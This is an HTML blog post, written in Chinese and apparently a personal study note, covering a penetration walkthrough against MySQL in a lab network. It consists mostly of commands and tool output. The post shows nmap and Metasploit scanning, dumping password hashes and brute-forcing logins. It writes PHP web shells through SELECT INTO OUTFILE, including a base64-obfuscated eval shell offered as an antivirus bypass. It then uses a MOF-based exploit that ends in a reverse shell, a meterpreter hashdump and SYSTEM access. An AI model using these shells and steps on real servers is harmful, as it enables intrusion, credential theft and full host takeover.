@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+
+
+<title>mysql渗透相关系列知识点 | Love to share</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+
+
+</head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Bentham&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Bentham&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div id="post-toc" class="post-toc">
+            <span class="post-toc-title">catalogue</span>
+            <div class="post-toc-content">
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#信息收集"><span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#端口信息收集"><span class="toc-text">端口信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#版本信息收集"><span class="toc-text">版本信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msf信息收集模块"><span class="toc-text">msf信息收集模块</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql密码爆破"><span class="toc-text">mysql密码爆破</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#通过mysql写shell"><span class="toc-text">通过mysql写shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql提权"><span class="toc-text">mysql提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-14更新"><span class="toc-text">3/14更新</span></a></li></ol></li></ol>
+            </div>
+        </div>
+    
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">mysql渗透相关系列知识点</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">zhhhy</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">March 12, 2019&nbsp;&nbsp;20:00:06</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <section class="post-content">
+            <h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口信息收集"><a href="#端口信息收集" class="headerlink" title="端口信息收集"></a>端口信息收集</h3><p>使用nmap，一般mysql都是3306端口。也可能存在自定义的端口，因此用nmap扫描端口以及开放的服务是有必要的。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 3306 172.16.1.100</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.60 ( https://nmap.org ) at 2019-03-07 19:03 CST</span><br><span class="line">Nmap scan report for bogon (172.16.1.100)</span><br><span class="line">Host is up (0.00029s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">3306/tcp open  mysql</span><br><span class="line">MAC Address: 1A:5B:1E:39:86:0E (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds</span><br></pre></td></tr></table></figure>
+
+<h3 id="版本信息收集"><a href="#版本信息收集" class="headerlink" title="版本信息收集"></a>版本信息收集</h3><p>做安全，对版本要求还是跟高的，细微的版本差异有可能使得payload就打不穿了。</p>
+<p>当存在明显注入的时候,可以使用内置函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select version();</span><br><span class="line">select @@version()；</span><br></pre></td></tr></table></figure>
+
+<p>或者使用sqlmap</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u url --dbms mysql</span><br></pre></td></tr></table></figure>
+
+<p>当phpmyadmin管理页面存在弱密码，比如root/root登陆成功后，查看<code>localhost-&gt;变量-&gt;服务器变量和设置中的version</code>参数值。</p>
+<p>使用msf扫描信息，前提是mysql开启了远程连接的权限，本地复现在数据库里加上这个</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use</span><br><span class="line">select user,host from user;</span><br><span class="line">GRANT ALL PRIVILEGES ON *.* TO &apos;root&apos;@&apos;172.16.1.105&apos; IDENTIFIED BY &apos;root&apos; WITH GRANT OPTION;</span><br></pre></td></tr></table></figure>
+
+<p>再使用msf的<strong>auxiliary/scanner/mysql/mysql_version</strong>模块进行扫描</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/mysql/mysql_version</span><br><span class="line"><span class="meta">#</span>#</span><br><span class="line">msf auxiliary(scanner/mysql/mysql_version) &gt; run</span><br><span class="line">[+] 172.16.1.100:3306     - 172.16.1.100:3306 is running MySQL 5.5.53 (protocol 10)</span><br><span class="line">[*] Scanned 1 of 1 hosts (100% complete)</span><br></pre></td></tr></table></figure>
+
+<h3 id="msf信息收集模块"><a href="#msf信息收集模块" class="headerlink" title="msf信息收集模块"></a>msf信息收集模块</h3><p>msf这个东西不是一般的变态，和mysql相关的模块可以使用search mysql来查询</p>
+<p>hash枚举</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sf auxiliary(scanner/mysql/mysql_hashdump) &gt; set password root</span><br><span class="line">password =&gt; root</span><br><span class="line">msf auxiliary(scanner/mysql/mysql_hashdump) &gt; run</span><br><span class="line"></span><br><span class="line">[+] 172.16.1.100:3306     - Saving HashString as Loot: root:*81F5E21E35407D**4A6CD4A731AEBFB6A**09E1B</span><br><span class="line">[+] 172.16.1.100:3306     - Saving HashString as Loot: root:*81F5E21E35407**84A6CD4A731AEBFB6AF**9E1B</span><br><span class="line">[+] 172.16.1.100:3306     - Saving HashString as Loot: root:*81F5E21E35407D***A6CD4A731AEB**6AF209E1B</span><br><span class="line">[+] 172.16.1.100:3306     - Saving HashString as Loot: root:*81F5E21E35407D***A6CD4A731AEBFB6AF209E**</span><br></pre></td></tr></table></figure>
+
+<p>获取相关信息：获取数据库版本，操作系统名称，架构，数据库目录，数据库用户以及密码哈希值。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf auxiliary(admin/mysql/mysql_enum) &gt; set username root</span><br><span class="line">username =&gt; root</span><br><span class="line">msf auxiliary(admin/mysql/mysql_enum) &gt; set password root</span><br><span class="line">password =&gt; root</span><br><span class="line">msf auxiliary(admin/mysql/mysql_enum) &gt; run</span><br><span class="line"></span><br><span class="line">[*] <span class="number">172.16</span><span class="number">.1</span><span class="number">.100</span>:<span class="number">3306</span> - Running MySQL Enumerator...</span><br><span class="line">[*] <span class="number">172.16</span><span class="number">.1</span><span class="number">.100</span>:<span class="number">3306</span> - Enumerating Parameters</span><br><span class="line">[*] <span class="number">172.16</span><span class="number">.1</span><span class="number">.100</span>:<span class="number">3306</span> - 	MySQL Version: <span class="number">5.5</span><span class="number">.53</span></span><br><span class="line">[*] <span class="number">172.16</span><span class="number">.1</span><span class="number">.100</span>:<span class="number">3306</span> - 	Compiled <span class="keyword">for</span> the following OS: Win32</span><br><span class="line">[*] <span class="number">172.16</span><span class="number">.1</span><span class="number">.100</span>:<span class="number">3306</span> - 	Architecture: AMD64</span><br><span class="line">[*] <span class="number">172.16</span><span class="number">.1</span><span class="number">.100</span>:<span class="number">3306</span> - 	Server Hostname: CHINA<span class="number">-20190124</span>J</span><br><span class="line">[*] <span class="number">172.16</span><span class="number">.1</span><span class="number">.100</span>:<span class="number">3306</span> - 	Data Directory: D:\phpstudy\PHPTutorial\MySQL\data\</span><br><span class="line">[*] <span class="number">172.16</span><span class="number">.1</span><span class="number">.100</span>:<span class="number">3306</span> - 	Logging of queries <span class="keyword">and</span> logins: OFF</span><br><span class="line">[*] <span class="number">172.16</span><span class="number">.1</span><span class="number">.100</span>:<span class="number">3306</span> - 	Old Password Hashing Algorith</span><br></pre></td></tr></table></figure>
+
+<p>这都建立在已经知道数据库名字和密码的前提下，有点后渗透的意味了。</p>
+<h2 id="mysql密码爆破"><a href="#mysql密码爆破" class="headerlink" title="mysql密码爆破"></a>mysql密码爆破</h2><p>使用phpMyAdmin多线程爆破工具。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">下载：https://portswigger.net/burp/、http://pan.baidu.com/s/1c1LD6co</span><br></pre></td></tr></table></figure>
+
+<p>使用msf爆破</p>
+<ul>
+<li><p>已知一个用户名以及口令，用来探测同网段是否有该密码和口令可连接的数据库</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf auxiliary(scanner/mysql/mysql_schemadump) &gt; use auxiliary/scanner/mysql/mysql_login </span><br><span class="line">msf auxiliary(scanner/mysql/mysql_login) &gt; set RHoSTS 172.16.1.0/24</span><br><span class="line">RHoSTS =&gt; 172.16.1.0/24</span><br><span class="line">msf auxiliary(scanner/mysql/mysql_login) &gt; set username root</span><br><span class="line">username =&gt; root</span><br><span class="line">msf auxiliary(scanner/mysql/mysql_login) &gt; set password root</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<ul>
+<li><p>还可以使用字典进行扫描</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/mysql/mysql_login</span><br><span class="line">set RHOSTS 192.168.157.1-254</span><br><span class="line">set pass_file /tmp/password.txt</span><br><span class="line">set username root</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>使用nmap爆破mysql密码</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=mysql-brute 172.16.1.100</span><br></pre></td></tr></table></figure>
+
+<p>其实爆破还是蛮鸡肋的，也算一种方法吧。</p>
+<h2 id="通过mysql写shell"><a href="#通过mysql写shell" class="headerlink" title="通过mysql写shell"></a>通过mysql写shell</h2><p>到处一句话木马文件，前提是要有写入的权限，并且知道网站的绝对路径，以及–secure-file-priv参数运行到处到任意目录</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select <span class="string">'&lt;?php @eval($_POST[cmd]);?&gt;'</span>INTO OUTFILE <span class="string">'D:/work/WWW/shell.php'</span></span><br><span class="line"><span class="comment">#创建出可以执行cmd命令的shell</span></span><br><span class="line">select <span class="string">'&lt;?php echo \'&lt;pre&gt;\';system($_GET[\'cmd\']); echo \'&lt;/pre&gt;\'; ?&gt;'</span> INTO OUTFILE <span class="string">'d:/www/cmd.php'</span></span><br><span class="line"><span class="comment">#linux </span></span><br><span class="line">SELECT <span class="string">'&lt;? system($_GET[\'c\']); ?&gt;'</span> INTO OUTFILE <span class="string">'/var/www/shell.php'</span>;</span><br></pre></td></tr></table></figure>
+
+<p>绕过杀毒，先在上传点上传shell.jpg。此时这个文件由于不是php后缀无法解析</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>$a=<span class="string">' PD9waHAgQGV2YWwoJF9QT1NUWydhbnRpYW4zNjUnXSk7ZGllKCk7Pz4='</span>;error_reporting(<span class="number">0</span>);@set_time_limit(<span class="number">0</span>);<span class="keyword">eval</span>(<span class="string">"?&gt;"</span>.base64_decode($a));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>再在数据库里写出一个包含文件，是的shell得到解析</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="string">'&lt;?php include '</span>shell.jpg<span class="string">' ?&gt;'</span>INTO OUTFILE <span class="string">'D:/work/WWW/shell.php'</span></span><br></pre></td></tr></table></figure>
+
+<p>使用sqlmap写shell</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u url--os-shell</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;?php @eval($_POST['c']);?&gt;"</span> &gt;/data/www/<span class="number">1.</span>php</span><br></pre></td></tr></table></figure>
+
+<h2 id="mysql提权"><a href="#mysql提权" class="headerlink" title="mysql提权"></a>mysql提权</h2><p>使用msf中的mof模块 <strong>windows/mysql/mysql_mof</strong></p>
+<p>没成功。。。很明显被–secure-file-priv这个参数给阻止了。由于。。是物理机作为靶机，就先简单试试。之后再拿虚拟机复现</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[*] Started reverse TCP handler on 172.16.1.105:4444 </span><br><span class="line">[*] 172.16.1.100:3306 - Attempting to login as 'root:root'</span><br><span class="line">[*] 172.16.1.100:3306 - Uploading to 'C:/windows/system32/mVvkv.exe'</span><br><span class="line">[-] 172.16.1.100:3306 - MySQL Error: RbMysql::OptionPreventsStatement The MySQL server is running with the --secure-file-priv option so it cannot execute this statement</span><br><span class="line">[*] 172.16.1.100:3306 - Uploading to 'C:/windows/system32/wbem/mof/thrBL.mof'</span><br><span class="line">[-] 172.16.1.100:3306 - MySQL Error: RbMysql::OptionPreventsStatement The MySQL server is running with the --secure-file-priv option so it cannot execute this statement</span><br><span class="line">[!] 172.16.1.100:3306 - This exploit may require manual cleanup of 'mVvkv.exe' on the target</span><br><span class="line">[!] 172.16.1.100:3306 - This exploit may require manual cleanup of 'wbem\mof\good\thrBL.mof' on the target</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br></pre></td></tr></table></figure>
+
+<p><strong>前提：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">要是能够通过网页连接管理（phpmyadmin），则可以修改host为%并刷新权限后，则可以通过msf等工具远程连接数据库。默认root等账号不允许远程连接，除非管理员或者数据库用户自己设置。</span><br><span class="line">use mysql;</span><br><span class="line">update user set host = '%' where user = 'root';</span><br><span class="line">FLUSH PRIVILEGES ;</span><br><span class="line">select host, user from user;</span><br><span class="line"><span class="meta">#</span>#复现的时候还发现一个问题</span><br><span class="line">unblock with 'mysqladmin flush-hosts'</span><br><span class="line">在数据库里执行 flush privileges; 就可以解决</span><br></pre></td></tr></table></figure>
+
+<p>关于提权部分，留坑。。配置一台虚拟机以后再试试。</p>
+<h3 id="3-14更新"><a href="#3-14更新" class="headerlink" title="3/14更新"></a>3/14更新</h3><p>使用msf的mysql_ mof对windows server 2003反弹shell成功</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; hashdump</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:c7562a9f398996e704da7a1ff47c554c:::</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">nt authority\system</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt;</span><br></pre></td></tr></table></figure>
+
+
+        </section>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>zhhhy</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://yoursite.com/2019/03/12/myhack-sql/">http://yoursite.com/2019/03/12/myhack-sql/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Solgan:</span>
+                         <span>Do you believe in <strong>DESTINY<strong>?</strong></strong></span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/渗透测试/"># 渗透测试</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2019/03/12/thinkphp31/">愉快的学习ThinkPHP3（3.1.2版本）之核心部分</a>
+            
+            
+            <a class="next" rel="next" href="/2019/03/12/javascript/">JavaScript基础知识</a>
+            
+        </section>
+
+
+    </article>
+</div>
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© zhhhy | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Sirice19/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+    </div>
+</body>
+</html>
